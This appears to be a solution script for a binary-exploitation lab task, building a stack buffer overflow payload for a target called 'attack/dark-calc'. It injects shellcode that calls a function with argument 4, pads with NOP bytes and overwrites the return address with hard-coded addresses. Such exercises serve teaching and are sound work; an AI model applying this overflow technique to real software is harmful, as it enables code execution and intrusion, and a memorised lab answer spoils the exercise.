#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

# mov edi, 4
# movabs rax, 0x401a87
# call rax
# ret
shellcode = (
    b"\xbf\x04\x00\x00\x00"
    + b"\x48\xb8"
    + p64(0x401a87)
    + b"\xff\xd0"
    + b"\xc3"
)

buffer_addr = 0x721000800fd0

payload = (
    shellcode.ljust(24, b"\x90")
    + p64(buffer_addr)
    + p64(0x401880)
)

sys.stdout.buffer.write(payload)
